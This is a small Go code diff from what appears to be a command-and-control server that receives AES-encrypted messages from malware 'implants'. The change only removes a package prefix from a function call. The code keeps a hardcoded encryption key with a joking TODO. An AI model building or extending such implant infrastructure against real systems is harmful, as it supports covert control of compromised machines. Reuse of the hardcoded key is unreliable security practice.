@@ -24,7 +24,7 @@ var messageTypeToFunc = map[int]func(net.Conn, interface{}){
 // done.
 func tcpHandler(conn net.Conn) {
 	defer conn.Close()
-	_, messageType, data, err := communication.ReceiveEnvelopeFromImplant(conn, []byte("thisis32bitlongpassphraseimusing")) //TODO: change aes key to a proper one :)
+	_, messageType, data, err := ReceiveEnvelopeFromImplant(conn, []byte("thisis32bitlongpassphraseimusing")) //TODO: change aes key to a proper one :)
 	if err != nil {
 		log.Printf("[ERROR] Could not understand message sent by implant. Reason: %s", err.Error())
 		return
